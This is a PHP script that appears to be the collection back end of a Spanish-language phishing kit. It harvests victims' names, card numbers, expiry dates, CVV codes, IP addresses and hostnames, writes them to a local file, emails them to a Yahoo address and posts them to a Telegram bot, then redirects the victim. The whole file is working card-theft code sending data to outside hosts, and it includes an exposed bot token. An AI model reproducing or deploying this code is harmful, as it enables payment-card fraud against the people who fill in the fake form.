<?php
$ip = getenv("REMOTE_ADDR");
$url = base64_decode($_GET['url']);
$back = "done.php" ;
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~~~~~~~\n";
$message .= "Nombre             : ".$_POST['1']."\n";
$message .= "Apellido           : ".$_POST['2']."\n";
$message .= "Tipo de tarjeta    : ".$_POST['12']."\n";
$message .= "Número de tarjeta  : ".$_POST['8']."\n";
$message .= "Fecha de caducidad : ".$_POST['9']."\n";
$message .= "CVV (CVC) : ".$_POST['10']."\n";
$message .= "~~~~~~~~~~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= "~~~~~~~ ok ~~~~~~~\n";
$file = fopen("README.txt","a");
fwrite($file, "\n".$message);
fclose($file);

$send = "saysmala@yahoo.com";
$subject = "CC2  MR BOSS 2K22 | $ip ";
$headers = "From:<MR VOSS 2K22>";
mail($send,$subject,$message,$headers);
header("Location: $back");

 $website="https://api.telegram.org/bot56677378794:AAFbn7SvtzXRQ7vDkwKE5KdoeoLg16VH_1Q";

$params=[
    'chat_id'=>'-4032790075',
    'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

echo json_encode($_POST); 
?>